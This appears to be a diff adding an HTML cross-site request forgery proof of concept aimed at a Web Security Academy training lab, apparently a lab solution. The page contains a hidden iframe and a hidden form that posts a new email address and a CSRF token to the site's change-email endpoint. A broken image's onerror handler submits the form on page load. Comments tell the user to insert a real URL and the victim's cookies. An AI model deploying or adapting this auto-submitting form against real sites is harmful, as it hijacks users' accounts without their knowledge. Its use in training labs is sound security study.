@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>Hello, world!</h1>
+    <iframe style="display: none;"  name="csrf-iframe"></iframe>
+    <form action="https://----web-security-academy.net/my-account/change-email/" target="csrf-iframe" method="post" id="csrf-form"> <!--# Add the real url from the request -->
+        <input type="hidden" name="email" value="test123@test.ca">
+        <input type="hidden" name="csrf", value="jd838yrjheu8ew9rjh9rf9erjdsi93feg3tj"> <!-- Before executing the script please add the valid cookies for user carlos -->
+    </form>
+    <img style="display: none;" src="http://https://----web-security-academy.net/?search" onerror="document.forms[0].submit()"> <!-- Add the search url for anything but replace the csrfkey cookie of user carlos-->
+</body>
+</html>
